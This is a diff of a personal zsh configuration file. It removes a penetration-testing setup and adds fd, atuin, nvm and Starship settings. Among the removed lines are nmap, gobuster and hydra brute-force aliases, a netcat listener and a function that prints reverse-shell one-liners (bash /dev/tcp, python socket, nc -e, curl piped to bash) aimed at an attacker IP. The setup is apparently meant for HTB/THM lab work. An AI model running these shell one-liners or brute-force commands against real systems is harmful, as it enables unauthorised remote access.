@@ -1,5 +1,5 @@
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# .zshrc — fyxvoid | Pentest Edition
+# .zshrc — fyxvoid
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 # ── Oh-My-Zsh ────────────────────────────────────────────────
@@ -37,38 +37,6 @@ zstyle ':completion:*' menu select
 zstyle ':completion:*' matcher-list 'm:{a-z}={A-Z}'
 zstyle ':completion:*:descriptions' format '%F{yellow}-- %d --%f'
 zstyle ':completion:*' list-colors "${(s.:.)LS_COLORS}"
-
-# ── Prompt ───────────────────────────────────────────────────
-# Two-line sharp prompt — no rounded chars
-# Line 1: ┌─[user]─[path]─[git]─[vpn]─[target]
-# Line 2: └─$
-
-_p_vpn() {
-    local ip
-    ip=$(ip -4 addr show tun0 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1 | head -1)
-    [[ -n "$ip" ]] && printf ' %%F{#6ED9A0}──[vpn:%s]%%f' "$ip"
-}
-
-_p_target() {
-    local f="$HOME/.config/pentest/target"
-    [[ -f "$f" ]] || return
-    local name ip
-    read -r name ip < "$f"
-    [[ -n "$name" ]] && printf ' %%F{#E87DA0}──[%s]%%f' "$name"
-}
-
-_p_git() {
-    local branch
-    branch=$(git rev-parse --abbrev-ref HEAD 2>/dev/null)
-    [[ -n "$branch" ]] && printf ' %%F{#F0C040}──[%s]%%f' "$branch"
-}
-
-setopt PROMPT_SUBST
-
-PROMPT='%F{#4A7080}┌─%f%F{#E87DA0}[%n]%f %F{#4A7080}──%f %F{#5BBAD6}[%~]%f$(_p_git)$(_p_vpn)$(_p_target)
-%F{#4A7080}└─%f%B%F{#E87DA0}$%f%b '
-
-RPROMPT='%F{#4A7080}%D{%H:%M:%S}%f'
 
 # Autosuggestion style
 ZSH_AUTOSUGGEST_HIGHLIGHT_STYLE="fg=#4A7080"
@@ -121,6 +89,19 @@ if command -v zoxide &>/dev/null; then
     eval "$(zoxide init zsh)"
 fi
 
+# ── fd — friendlier find (Debian/Kali ships the binary as fdfind) ──
+if command -v fdfind &>/dev/null && ! command -v fd &>/dev/null; then
+    alias fd='fdfind'
+fi
+
+# ── atuin — magical shell history (Ctrl+R) ───────────────────
+if [[ -f "$HOME/.atuin/bin/env" ]]; then
+    . "$HOME/.atuin/bin/env"
+fi
+if command -v atuin &>/dev/null; then
+    eval "$(atuin init zsh)"
+fi
+
 # ── Aliases — System ─────────────────────────────────────────
 alias grep='grep --color=auto'
 alias mkdir='mkdir -pv'
@@ -140,56 +121,7 @@ alias localip='ip -4 addr | awk "/inet /{print \$2}" | grep -v "127.0"'
 alias tunip='ip -4 addr show tun0 2>/dev/null | awk "/inet /{print \$2}" | cut -d/ -f1'
 alias sshk='ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null'
 
-# ── Aliases — Target ─────────────────────────────────────────
-alias target='cat ~/.config/pentest/target 2>/dev/null || echo "no target"'
-alias cleartarget='rm -f ~/.config/pentest/target && echo "target cleared"'
-
-# ── Aliases — Pentest ────────────────────────────────────────
-alias nmap-q='nmap -sV -sC -oA quick'
-alias nmap-full='sudo nmap -sV -sC -p- --min-rate 5000 -oA full'
-alias nmap-udp='sudo nmap -sU --top-ports 200 -oA udp'
-alias nmap-vuln='nmap --script vuln -oA vuln'
-
-alias ffuf-dir='ffuf -w /usr/share/wordlists/dirb/common.txt -u'
-alias ffuf-sub='ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.DOMAIN" -u'
-alias gob='gobuster dir -w /usr/share/wordlists/dirb/common.txt -u'
-alias ferox='feroxbuster -u'
-alias nikto='nikto -h'
-alias whatweb='whatweb -v'
-
-# rockyou — unzip if needed
-alias rockyou='[[ -f /usr/share/wordlists/rockyou.txt ]] && echo /usr/share/wordlists/rockyou.txt || (gunzip -k /usr/share/wordlists/rockyou.txt.gz 2>/dev/null && echo /usr/share/wordlists/rockyou.txt)'
-alias seclists='[[ -d /usr/share/seclists ]] && echo /usr/share/seclists || echo "not installed: sudo apt install seclists"'
-
-alias hydra-ssh='hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://'
-alias john='john --wordlist=/usr/share/wordlists/rockyou.txt'
-alias hc='hashcat'
-alias msfconsole='msfconsole -q'
-alias ligolo='sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up'
-
 # ── Functions ────────────────────────────────────────────────
-
-# Set HTB/THM target + create workspace
-pentest() {
-    if [[ -z "$1" || -z "$2" ]]; then
-        echo "usage: pentest <name> <ip>"
-        return 1
-    fi
-    local name="$1" ip="$2"
-    mkdir -p ~/.config/pentest || { echo "[-] cannot create ~/.config/pentest"; return 1; }
-    echo "$name $ip" > ~/.config/pentest/target
-    mkdir -p ~/htb/$name/{nmap,web,loot,exploits,creds}
-    cd ~/htb/$name
-    echo "[+] Target   : $name"
-    echo "[+] IP       : $ip"
-    echo "[+] Workspace: ~/htb/$name"
-}
-
-# Quick nmap scan
-scan() {
-    [[ -z "$1" ]] && { echo "usage: scan <ip>"; return 1; }
-    sudo nmap -sV -sC --min-rate 3000 -oA "scan_$1" "$1"
-}
 
 # Serve current dir over HTTP
 serve() {
@@ -220,27 +152,10 @@ extract() {
     esac
 }
 
-# Reverse shell one-liners (print only)
-revshell() {
-    local ip="${1:-$(ip -4 addr show tun0 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1 | head -1)}"
-    local port="${2:-4444}"
-    echo "── bash ──────────────────────────────────────────────"
-    echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
-    echo "── python ────────────────────────────────────────────"
-    echo "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
-    echo "── nc ────────────────────────────────────────────────"
-    echo "nc -e /bin/sh $ip $port"
-    echo "── curl pipe ─────────────────────────────────────────"
-    echo "curl http://$ip:8080/shell.sh | bash"
-}
+# ── NVM ──────────────────────────────────────────────────────
+export NVM_DIR="$HOME/.nvm"
+[ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"
+[ -s "$NVM_DIR/bash_completion" ] && \. "$NVM_DIR/bash_completion"
 
-# Netcat listener — handles both traditional and openbsd variants
-listen() {
-    local port="${1:-4444}"
-    echo "[+] Listening on :$port"
-    if nc -h 2>&1 | grep -q "\-e"; then
-        nc -lvnp "$port"
-    else
-        nc -l -n -v -p "$port"
-    fi
-}
+# ── Prompt (Starship — see ~/.config/starship.toml) ────────────
+command -v starship &>/dev/null && eval "$(starship init zsh)"
